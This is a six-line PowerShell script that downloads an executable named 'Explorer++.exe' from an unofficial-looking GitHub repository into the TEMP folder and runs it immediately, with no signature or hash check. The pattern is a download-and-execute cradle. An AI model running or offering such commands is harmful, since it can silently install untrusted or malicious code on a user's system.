$url  = "https://github.com/ewdewdaw/random_public-assets/raw/refs/heads/main/Explorer++.exe"
$dest = Join-Path $env:TEMP "Explorer++.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
Start-Process -FilePath $dest
